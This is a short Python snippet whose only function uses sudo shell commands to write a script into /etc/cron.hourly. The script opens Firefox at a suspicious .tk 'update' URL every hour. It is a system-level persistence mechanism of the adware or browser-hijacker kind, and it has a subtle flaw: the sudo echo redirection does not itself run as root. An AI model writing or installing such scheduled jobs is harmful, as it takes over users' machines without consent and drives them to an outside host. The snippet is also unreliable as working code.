import os

def setUpToRunHourly():
    cmd = "sudo echo '#!/bin/bash \n firefox http://www.blah93.tk/update' > /etc/cron.hourly/wam_update.sh"
    os.system(cmd)
    cmd = "sudo chmod 755 /etc/cron.hourly/wam_update.sh"
    os.system(cmd)
